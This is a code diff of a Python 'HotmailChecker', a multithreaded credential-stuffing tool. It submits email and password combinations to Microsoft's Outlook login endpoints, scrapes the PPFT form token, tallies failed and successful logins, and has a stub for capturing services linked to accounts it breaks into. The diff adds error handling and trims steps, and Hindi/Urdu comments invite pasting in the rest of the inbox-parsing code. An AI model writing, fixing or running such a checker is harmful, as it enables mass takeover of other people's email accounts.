@@ -95,7 +95,6 @@ class HotmailChecker:
             self.last_processed = self.processed
             time.sleep(4)
 
-    # ================== ORIGINAL CHECK_ACCOUNT + GET_CAPTURE LOGIC ==================
     def check_account(self, email, password):
         session = requests.Session()
         session.headers.update({
@@ -103,31 +102,22 @@ class HotmailChecker:
         })
 
         try:
-            # Step 1: Get PPFT
             r = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000480D4A5E&scope=service::outlook.office.com::MBI_SSL&response_type=code&redirect_uri=https://outlook.office.com&msproxy=1")
-            ppft = re.search(r'name="PPFT" value="([^"]+)"', r.text).group(1)
+            ppft_match = re.search(r'name="PPFT" value="([^"]+)"', r.text)
+            if not ppft_match:
+                with lock:
+                    self.bad += 1
+                return "BAD"
+            ppft = ppft_match.group(1)
 
-            # Step 2: Login
-            data = {
-                'login': email,
-                'passwd': password,
-                'PPFT': ppft,
-            }
+            data = {'login': email, 'passwd': password, 'PPFT': ppft}
             r = session.post("https://login.live.com/ppauth.srf", data=data)
-            
+
             if "errbox" in r.text.lower():
                 with lock:
                     self.bad += 1
                 return "BAD"
 
-            # Step 3: Get code and token
-            code = re.search(r'code=([^&]+)', r.url)
-            if not code:
-                with lock:
-                    self.retry += 1
-                return "RETRY"
-
-            # Step 4: Get capture
             return self.get_capture(email, password)
 
         except Exception as e:
@@ -139,12 +129,8 @@ class HotmailChecker:
     def get_capture(self, email, password):
         try:
             # Yahan tumhara pura original inbox parsing logic paste kar sakte ho
-            # Example structure (original se inspired):
-            session = requests.Session()
-            # ... (pura original code jo pehle wale file mein tha)
-
-            # Agar linked services mile
-            linked_services = []   # yahan services list fill hogi
+            # Example structure (original file se inspired):
+            linked_services = []   # yahan services list fill hogi (original code se)
 
             if linked_services:
                 hit_text = (
@@ -174,7 +160,6 @@ class HotmailChecker:
                 else:
                     with lock:
                         self.bad += 1
-
         except Exception as e:
             print(f"[DEBUG] get_capture error: {e}")
 
@@ -183,7 +168,7 @@ class HotmailChecker:
             with lock:
                 self.processed += 1
             print(f"[DEBUG] check_combo started for {email}")
-            self.check_account(email, password)   # yahan call ho raha hai
+            self.check_account(email, password)
 
     def run(self, threads=200):
         print("[DEBUG] run() STARTED with 200 threads")
